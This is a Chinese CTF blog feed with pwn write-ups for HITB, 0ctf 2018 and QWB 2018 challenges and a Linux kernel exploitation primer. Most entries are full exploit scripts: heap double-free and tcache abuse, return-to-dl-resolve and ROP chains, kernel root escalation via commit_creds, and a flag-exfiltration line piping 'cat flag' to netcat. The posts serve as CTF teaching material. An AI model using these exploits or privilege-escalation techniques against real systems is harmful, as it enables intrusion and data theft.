u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak3 = u64(p.recv(6).ljust(8,'\0'))print '[*] setbuf ',hex(leak1)print '[*] usleep ',hex(leak2)print '[*] gets ',hex(leak3)libc.address = leak1 - libc.symbols['setbuf']print '[*] system ',hex(libc.symbols['system'])context.clear(arch = 'amd64')#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))target = libc.symbols['system']#str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%((target&amp;0xff),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%(((target&amp;0xff)),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 += ';/bin/sh\0;'str1 = str1.ljust(48,'a')str1 += p64(0x601028)str1 += p64(0x601029)print '[+] ',len(str1)#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) if ('\x20' in str1) | ('\x0a' in str1): print '[-]' print str1 exit(0)print str1p.sendline(str1)p.interactive()'''[*] setbuf 0x7fdcfdb2e6b0[*] usleep 0x7fdcfdbb5d60[*] gets 0x7fdcfdb26d80[*] system 0x7fdcfdafd390''' gundam此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。 1234567891011121314151617181920212223242526272829__int64 destroy()&#123; __int64 result; // rax@5 __int64 v1; // rcx@8 unsigned int v2; // [sp+4h] [bp-Ch]@3 __int64 v3; // [sp+8h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); if ( !bss_sum ) &#123; puts("No gundam");LABEL_7: result = 0LL; goto LABEL_8; &#125; printf("Which gundam do you want to Destory:"); __isoc99_scanf("%d", &amp;v2); if ( v2 &lt;= 8 &amp;&amp; bss_list[(unsigned __int64)v2] ) &#123; *(_DWORD *)bss_list[(unsigned __int64)v2] = 0; free(*(void **)(bss_list[(unsigned __int64)v2] + 8LL)); goto LABEL_7; &#125; puts("Invalid choice"); result = 0LL;LABEL_8: v1 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125; 其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在之前的博客 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。 堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。 此题选择覆写__free_hook为system，最终free拿到shell。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *debug = 0#HITB&#123;now_you_know_about_tcache&#125;if debug: p = process('./gundam') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.37.114', 9999) libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def build(name,type): p.recvuntil('choice :') p.sendline('1') p.recvuntil('The name of gundam :') p.send(name) p.recvuntil('The type of the gundam :') p.sendline(str(type))def visit(): p.recvuntil('choice :') p.sendline('2')def destroy(index): p.recvuntil('choice :') p.sendline('3') p.recvuntil('Which gundam do you want to Destory:') p.sendline(str(index))def blow(): p.recvuntil('choice :') p.sendline('4')for i in range(0,9): build('p4nda',1) for i in range(0,9): destroy(i)blow()for i in range(0,8): build('a'*8,1)build('a'*8,1)visit()p.recvuntil('Gundam[7] :aaaaaaaa')libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols['__malloc_hook']print '[*] system:',hex(libc.symbols['system'])for i in range(0,8): destroy(i)blow()build('p4nda',1) #0build('/bin/sh\0',1) #0 1build('p4nda',1) #0destroy(0)destroy(0)build(p64(libc.symbols['__free_hook']-0x10),1)# 0 1 2build('a'*0x30,1)build(p64(libc.symbols['system'])*3,1)destroy(1)p.interactive()]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF KETNEL PWN 入门记录]]></title>
    <url>%2F2018%2F04%2F04%2Fkernel-pwn-start%2F</url>
    <content type="text"><![CDATA[从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。 最开始参考的是安全客上的两篇文章，都来自o0xmuhe Linux 内核漏洞利用教程（一）：环境配置 Linux 内核漏洞利用教程（二）：两个Demo 本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…） 环境配置编译内核文中提到的安装依赖库及qemu时，在make menuconfig就很懵… 1234567$ cd linux-2.6.32.1/$ sudo apt-get install libncurses5-dev$ sudo apt-get install qemu qemu-system$ make menuconfig$ make$ make all$ make modules 突然出现一大堆选项，而且并不知道是干嘛的… 最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的Save an Alternate Configuration File，然后选择默认命名的.config就可以了。 其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。 编译busybox在编译busybox时，需要去掉 1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统 2 Networking Utilities -&gt; [] inetd (Internet超级服务器) 配置busyboxqemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功） 首先，在busy-box的根目录下建立_install文件夹，作为文件系统 12cd _installmkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125; 在_install中的etc文件中增加inittab文件， 123456789cd etctouch inittab-----------------------This is Content---------------------------::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init 增加etc/init.d/rcS文件 123456789101112mkdir init.dcd init.dtouch rcS-----------------------This is Content---------------------------#!/bin/sh#!/bin/shmount -t proc none /procmount -t sys none /sys/bin/mount -n -t sysfs none /sys/bin/mount -t ramfs none /dev/sbin/mdev - 建立完上述文件后，可以制作img镜像了。 在_install文件夹下： 1find . | cpio -o --format=newc &gt; ../rootfs.img 启动qemu启动gdb的脚本 12345678910gdb \ -ex "add-auto-load-safe-path $(pwd)" \ -ex "file vmlinux" \ -ex 'set arch i386:x86-64:intel' \ -ex 'target remote localhost:1234' \ -ex 'break start_kernel' \ -ex 'continue' \ -ex 'disconnect' \ -ex 'set arch i386:x86-64' \ -ex 'target remote localhost:1234' 启动qemu的脚本 1qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 两个Demo编译内核驱动编译内核及利用的exp、poc时，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下。 另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile 每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。 NULL Dereference这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。 因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。 和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。 附64位的exp 123456789101112131415161718192021222324-----------------------shellcode.s -----------------xor %rax,%raxmov %rax,%rdicall 0xffffffff81081030mov %rax,%rdicall 0xffffffff81080e40ret------------------------exp.c ---------------------#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char shellcode[] = "\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3";int main()&#123; mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, shellcode, sizeof(shellcode)); int fd = open("/proc/bug1", O_WRONLY); write(fd, "muhe", 4); system("/bin/sh");//get root shell return 0;&#125; Kernel Stack Overflow这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了… 在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;unsigned long long eip,user_cs,user_eflags,user_sp,user_ss;char bin_sh[] = "/bin/sh";struct trap_frame&#123; void *eip; uint32_t cs; uint32_t eflags; void *rsp; uint32_t ss;&#125;__attribute__((packed));struct trap_frame tf;void get_shell(void)&#123; system("/bin/sh");&#125;void init_tf_work(void)&#123; unsigned long long i = 0x50; unsigned long long j = 0x78; asm( //"pushq %%ss\n" "subq %2,%%rsp\n" "movq %%ss,%%rax\n" "pushq %%rax\n" "pushq %%rsp\n" "pushfq\n" //"pushq %%cs\n" "movq %%cs,%%rax\n" "pushq %%rax\n" "pushq %0\n" "movq %%rsp,%1\n" "addq %3,%%rsp" :"=m"(eip),"=r"(user_sp),"=m"(i),"=m"(j) : :"memory" );&#125;#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff81080db0;void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81080bc0;void payload(void)&#123; //payload here commit_creds(prepare_kernel_cred(0)); asm( "movq %0,%%rsp\n" "iretq\n" :"=m"(user_sp) );&#125;int main(void)&#123; char buf[40]; memset(buf,0x41,40); eip =(unsigned long long) get_shell; *((void**)(buf+32)) = &amp;payload; //set eip to payload init_tf_work(); write(1,buf,sizeof(buf)); int fd = open("/proc/bug2",O_WRONLY); //exploit write(fd,buf,sizeof(buf)); return 0;&#125;]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>KERNEL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F04%2F04%2F0ctf2018%2F</url>
    <content type="text"><![CDATA[这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。 靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。 babystack一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。 这篇博客对这个知识点讲的很清楚 http://www.freebuf.com/articles/system/149214.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *from ctypes import *import hashlibimport stringdebug = 0elf = ELF('./babystack')#flag&#123;return_to_dlresolve_for_warming_up&#125;ct = string.ascii_letters+string.digits#context.log_level = 'debug'def login(io):# io.recvuntil("+") s = io.recvline()[:-1] #io.recvuntil("== ") #dst = io.recvuntil("\n")[:-1] print repr(s) #print repr(dst) def getpre(): for c1 in ct: for c2 in ct: for c3 in ct: for c4 in ct: pre = c1 + c2 + c3 + c4 #hasho = hashlib.sha256(s+pre) #print hasho.hexdigest() if hashlib.sha256(s + pre).digest().startswith('\0\0\0'):#hasho.hexdigest().lower().startswith('\0\0\0'): return pre pre = getpre() print pre io.send(pre)if debug: p = process('./babystack') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p =remote('202.120.7.202', 6666) #libc = ELF('./libc-2.23.so') #off = 0x001b0000 login(p) context.log_level = 'debug'bss_start = 0x804a000leave_ret = 0x8048455pppr = 0x080484e9relplt = 0x80482b0#gdb.attach(p,'b *0x80484e9')part1 = 'a'*0x28 + p32(bss_start+0x800) + p32(elf.symbols['read']) + p32(leave_ret) + p32(0) + p32(bss_start+0x800) + p32(40)print '[*] part1 ' ,len(part1)#p.send(part1)rop1 = p32(bss_start+0x800+0x200) + p32(elf.symbols['read']) + p32(pppr) + p32(0) + p32(bss_start + 0x100) +p32(44)rop1 += p32(0x80482f0) + p32(bss_start+0x100 - relplt) +p32(pppr)+ p32(0x804a124)# + p32(0) + p32(bss_start + 0x200) +p32(0x100)print '[*] part2 ' ,len(rop1)#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) #p.send(rop1)rop2 = p32(0x0804a00c)+p32(0x0001f407)+ p32(0xdeadbeef) + p32(0x1ef0) + p32(0) + p32(0) + p32(12) + 'system\0\0'rop3 = rop2 + '/bin/sh\0'print '[*] part3 ' ,len(rop3)#rop = rop3 + 'a'*(0x100-len(rop3))p.send(part1+rop1+rop3)p.interactive()'''0x080484eb : pop ebp ; ret0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080482e9 : pop ebx ; ret0x080484ea : pop edi ; pop ebp ; ret0x080484e9 : pop esi ; pop edi ; pop ebp ; ret 0x00000006 (SYMTAB) 0x80481cc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x804827cpwndbg&gt; x /4wx 0x80481cc+160x80481dc: 0x0000001a 0x00000000 0x00000000 0x00000012''' 拿到shell，发现此题没有输出… 解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了… 最后看到flag，果然这种方法就是预期解… babyheap此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是alignedhook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\_malloc_hook为one_gadget，从而拿到shell了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env python# coding=utf-8from pwn import *#flag&#123;have_fun_with_fastbin&#125;context.log_level = "DEBUG"p = remote("202.120.7.204",127)#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)def allocate(size): p.sendlineafter('Command:', '1') p.sendlineafter('Size:', str(size))def update(index, size, content): p.sendlineafter('Command:', '2') p.sendlineafter('Index:', str(index)) p.sendlineafter('Size:', str(size)) p.sendlineafter('Content:', content)def delete(index): p.sendlineafter('Command:', '3') p.sendlineafter('Index:', str(index))def view(index): p.sendlineafter('Command:', '4') p.sendlineafter('Index:', str(index))allocate(0x58) # 0allocate(0x58) # 0 1allocate(0x58) # 0 1 2 update(0, 0x59, 'a'*0x58 + '\xc1')allocate(0x20) # 0 1 2 3delete(1) # 0 2 3allocate(0x58) # 0 1 2 3view(2)p.recvuntil('Chunk[2]: ')leak_addr = u64(p.recv(6) + '\x00\x00')main_arena = leak_addr - 88print('main_arena is ' + hex(main_arena))libc = ELF('./libc-2.24.so')#('/lib/x86_64-linux-gnu/libc.so.6')libcbase = main_arena - 0x10 - libc.symbols['__malloc_hook']delete(3)allocate(0x58) # 0 1 2 3delete(3)allocate(0x58) # 0 1 2 3 (2==3)allocate(0x58) # 0 1 2 3 4allocate(0x58) # 0 1 2 3 4 5 allocate(0x38) # 0 1 2 3 4 5 6allocate(0x48) # 0 1 2 3 4 5 6 7update(4, 0x59, 'a'*0x58 + '\xf1')delete(5) # 0 1 2 3 4 6 7allocate(0x58) # 0 1 2 3 4 5 6 7allocate(0x38) # 0 1 2 3 4 5 6 7 8(6==8)delete(8) update(6, 0x8, p64(0x60))allocate(0x38)delete(3)update(2, 0x8, p64(main_arena + 0x10))allocate(0x58) # 0 1 2 3 4 5 6 7 8 allocate(0x58) # 0 1 2 3 4 5 6 7 8 9malloc_hook_head = main_arena - 0x10 - 0x10update(9, 0x58, p64(0)*7 + p64(malloc_hook_head) + p64(0) + p64(leak_addr)*2)allocate(0x40)one_gadget = libcbase + 0x3f35aupdate(10, 8, p64(one_gadget))#db.attach(p)allocate(0x10)#delete(2)#delete(3)p.interactive()'''0x3f306 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x3f35a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xd695f execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''''''0x45526 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4557a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf1651 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0xf24cb execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''' blackhole此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。 并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。 并且发现自己的汇编语言写的真是渣… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#!/usr/bin/env python# coding=utf-8from pwn import *import threadingimport stringimport random, string, subprocess, os, sysfrom hashlib import sha256os.chdir(os.path.dirname(os.path.realpath(__file__)))check_result = Falsedef check(offset, guess, method): # p = process('./blackhole') # gdb.attach(p, open('debug')) global check_result check_result = False while True: p = remote('202.120.7.203', 666) # p = remote('127.0.0.1', 5555) def pow(): chal = p.recvline()[:-1] print chal.encode('hex') for c1 in xrange(256): for c2 in xrange(256): for c3 in xrange(256): for c4 in xrange(256): sol = ''.join(map(chr, (c1, c2, c3, c4))) if sha256(chal + sol).hexdigest().startswith('00000'): p.send(sol) print sha256(chal + sol).hexdigest() return True return False if pow() == True: break output_buffer = '' context.arch = 'amd64' elf = ELF('./blackhole') # context.log_level = 'DEBUG' pop6 = 0x400A4A mov_call = 0x400A30 bss = 0x601100 pop_rbp = 0x4007c0 leave_ret = 0x4009A5 def callfunc(func, arg1, arg2, arg3): rop = p64(pop6) rop += p64(0) + p64(1) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1) rop += p64(mov_call) return rop rop = 'a'*40 rop += callfunc(elf.got['read'], 0, bss, 320) rop += p64(0)*7 rop += p64(pop_rbp) + p64(bss - 8) + p64(leave_ret) rop = rop.ljust(0x100, 'a') # p.send(rop) output_buffer += rop context.arch = 'amd64' shellcode = shellcraft.open('/home/blackhole/flag', constants.O_RDONLY) # shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY) shellcode += shellcraft.read('rax', bss, 60) shellcode += "mov al, byte ptr [%s]; cmp al, %s;" % (hex(0x601100 + offset), hex(guess)) if method == 'equal': shellcode += "jne Exit;" elif method == 'smaller': shellcode += "jl Exit;" else: shellcode += "jg Exit;" shellcode += "Loop:" shellcode += shellcraft.read(0, bss + 0x100, 0x10) # just block the program shellcode += 'jmp Loop;' shellcode += 'Exit:' + shellcraft.exit(0) shellcode = asm(shellcode) bss_rop = callfunc(elf.got['read'], 0, elf.got['alarm'], 1) bss_rop += callfunc(elf.got['read'], 0, bss, constants.SYS_mprotect) bss_rop += callfunc(elf.got['alarm'], 0x601000, 0x1000, 0x7) bss_rop += callfunc(elf.got['read'], 0, bss, len(shellcode)) bss_rop += p64(0)*7 bss_rop += p64(bss) #p.send(bss_rop) # print 'len(bss_rop) is ' + hex(len(bss_rop)) output_buffer += bss_rop # p.send('\x05' + 'a' * constants.SYS_mprotect) # output_buffer += '\x05' + 'a' * constants.SYS_mprotect output_buffer += '\x85' + 'a' * constants.SYS_mprotect output_buffer += shellcode old_time = time.time() # print len(output_buffer) p.send(output_buffer.ljust(0x800, 'f')) try: for i in xrange(5): p.sendline('hack you') print("hack you") time.sleep(1) times = i p.close() except Exception as e: times = i p.close() if times &gt; 3: check_result = True def binSearch(offset, start, end): while start &lt; end: print start, end, chr(start), chr(end) medium = (start + end) / 2 check(offset, medium, 'equal') if check_result: return medium check(offset, medium, "smaller") if check_result: start, end = medium, end else: start, end = start, medium return start flag = 'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'for i in range(len(flag), 60): result = binSearch(i, 33, 128) flag += chr(result) log.info("flag is " + flag)]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QWBCTF 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F03%2F27%2FQWB2018%2F</url>
    <content type="text"><![CDATA[opm题目分析本题逻辑比较清晰，仅有两个功能，添加成员和展示全部成员两个功能。 其中，在BSS段上维护了一个数组，用于存储成员的数据结构。该数据结构包括两个从堆上申请的数据块组成。 分别是定长为0x30（new（0x20））的节点，和由malloc（len(s)）申请的动态节点构成。 12340 8 16 24 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| function ptr | address | length | int |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 添加用户函数主要就是维护这个变量 展示全部成员就是利用function ptr来打印全部成员变量的内容。 漏洞利用此题在add_role函数中，十分明显的使用gets(s)留出了两个栈溢出漏洞，但是此题开启了全部保护，让所有地址均位置。并且gets函数有一个非常明显的弊端，会在输入的最后加入’\0’，泄露更加困难。 其实，这道题主要考察堆地址的构造，因为和堆块大小关系并不大。 堆地址泄露首先，申请一个较大的块，保证不出现溢出，这样使下一块分配地址是，输入内容部分会申请得到以00结尾的字符串。 然后，申请一个包含溢出的块，如’b’*0x80+’\x20’，如此一来，会把本来要写到节点堆块的数据向上写入，写到以0020结尾的段地址空间去，由于此题在前方已申请了大量空间，所以保证以0020为结尾的块，不会出现由于未mmap，导致的段错误。这样相当于在一个末位2字节已知的地址，写入了第二个数据结构内容部分的地址。 然后，申请一个刚好为0x80的块，如’c’*0x80，这样，gets输入的\0会覆盖要写入的地址，这样就会将地址写入到最低一字节为00的地址去，根据堆地址的构造，这个地方恰好属于第二个块的内容部分，且被’b’填充，当写入后，如果可以利用printf等函数打印出第二个块内容，就可以成功泄露堆地址了。当然，直接show一定是不行的。 最后，再次申请一个数据块，在第一部分输入内容时并不溢出而在第二个输入数字处溢出一个字节，使这个地址变成第二个块地址写入的0020结尾的地址，此题恰好保证分配过程中前6字节数据不变，在写入int后，就会执行打印操作，也就是打印第二块的内容，顺便打印出了堆地址。 1234add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20') 有了堆地址以后，相当于堆分配的全部地址均可预测。(所谓预测，就是写到每步的时候动态调一下，然后直接找当时的内存做减法) ###PIE泄露 首先，可以利用堆地址反向解析出第一块自定义的存储print函数的堆块地址，将这个写入到某堆块内容中去，而这个新申请堆块的值也是可以预测的，因此，再申请一块堆，使其溢出溢出到前一个内容块的地址-0x08处去，相当于在前一块堆上构造了一个伪造的节点，这样就可以泄露print函数的地址，也就相当于PIE地址。 libc地址泄露与PIE泄露类似，通过PIE，可以获取puts函数的got表地址，利用这个地址已经同样的泄露方法，可以获取libc的地址。 控制流劫持控制流劫持的方法与这个方法一样，同样在堆上构造一个伪造的块，其中填入one_gadget的地址，再次申请一个堆块，覆盖返回值为上一块的内容，最后调用show函数，就可以执行one_gadget了，从而拿到shell。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *from ctypes import *debug = 1elf = ELF('./opm')if debug: p = process('./opm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.33.43', 13572) context.log_level = 'debug'def add(name,punch): p.recvuntil('(E)xit\n') p.sendline('A') p.recvuntil('name:\n') p.sendline(name) p.recvuntil('punch?\n') p.sendline(str(punch))def show(): p.recvuntil('(E)xit\n') p.sendline('S') add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20')p.recvuntil('&lt;bbbbbbbb')heap_addr = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00'))print '[*] heap : ', hex(heap_addr)offset = 0x0000561b9016ec20 - 0x561b9016edc0print_addr1 = heap_addr + offsetoffset2 = 0x55f94cef9ed0 - 0x55f94cef9dc0print '[*] ptr_addr : ', hex(print_addr1)add(p64(print_addr1),'4')add('e'*10 , 'e'*0x80 + p64(heap_addr + offset2 -8))p.recvuntil('&lt;')PIE = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - 0XB30print '[*] pie : ', hex(PIE)add(p64(PIE+elf.got['puts']),'5')offset3 = 0x55f960027f70 - 0x55f960027dc0add('f'*10 , 'f'*0x80 + p64(heap_addr + offset3 -8))p.recvuntil('&lt;')libc.address = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - libc.symbols['puts']print '[*] system : ', hex(libc.symbols['system'])add(p64(libc.address + 0x4526a),'6')block_exploit = heap_addr +0x5608f0cd5010 - 0x5608f0cd4dc0add('/bin/sh\0'+'\x00'*0x78 + p64(block_exploit) ,1)gdb.attach(p)p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' note题目分析此题最开始发现是标准的socket + fork写法，这样写法通常是会爆破canary或者地址，但是note这题暂时没用上。 经AAA战队的大佬提醒，在note2题目中会用到，to becontinue… 直接来看fork之后的函数，首先就是会getpwnam(”note“)操作，调试的时候，直接新建一个这个用户就能过了.. 关键函数中，主要申请了3块内存 对于title这个变量，是有限制的，遇到0x26232722403f210a任意一个时会截断，这样截断后会在堆块末尾写入这个截断值，此时会有一个溢出（off-by-one）。 对于content变量，理论上智能改变3次，使用realloc进行扩容或者缩小。并且提供打印功能。 对于comment变量是任意写的。 漏洞利用此题比较特殊的点在于题目没有free，当没有free时，就需要创造free了… 通过阅读realloc代码，可以发现其处理逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051else &#123; /* Try to expand forward into top */ if (next == av-&gt;top &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb + MINSIZE)) &#123; ... &#125; /* Try to expand forward into next chunk; split off remainder below */ else if (next != av-&gt;top &amp;&amp; !inuse (next) &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb)) &#123; newp = oldp; unlink (av, next, bck, fwd); &#125; /* allocate, copy, free */ else &#123; ** newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk (newmem); newsize = chunksize (newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) &#123; newsize += oldsize; newp = oldp; &#125; else &#123; /* Unroll copy of &lt;= 36 bytes (72 if 8byte sizes) We know that contents have an odd number of INTERNAL_SIZE_T-sized words; minimally 3. */ ...... ** _int_free (av, oldp, 1); check_inuse_chunk (av, newp); return chunk2mem (newp); &#125; 在标**的行发现，realloc当想要拓展当前块的时候，会检查下一块释放被占用，如果被占用，则会利用int_malloc函数申请一个新的堆块，并且释放原来占用的堆块。 分析一下现状： 存在一个指针数组在bss段上，指针会指向堆地址 存在off-by-one，可以修改content所在堆块大小，但只能修改为特定值，且小于原来的堆块大小 content前块和后块内容均可以任意写 想到的一个思路是unlink，这样就可以劫持bss段的数组进而可以任意读任意写。 首先，想到content块会变小，如果与后面的堆空间unlink，会过不去libc的检测，因为没有指针指向后块地址，因此需要选择前块作为unlink的目标块，则size需要覆盖为pre_inuse为0的值（0x40），选定了这个值以后，前块的fake chunk就可以构造了。 然后，需要思考如何触发unlink。在第一次realloc时，libc会将改小的堆块放到fastbin中去，而这时需要如何触发unlink呢？ 在查看代码中发现，malloc_consolidate函数会对fastbin链中各个堆块进行遍历，对符合前后块！inuse的堆块做unlink，这样恰好符合需求。 在什么时候会触发malloc_consolidate呢？在_int_malloc 中发现，在申请较大堆块，导致前面的一系列分配均无法满足时，会触发该函数。因此，我选择申请0x21000大小的堆块，该堆块大于brk分配的初始堆大小，则一定可以触发malloc_consolidate 12345678910111213141516171819... /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs 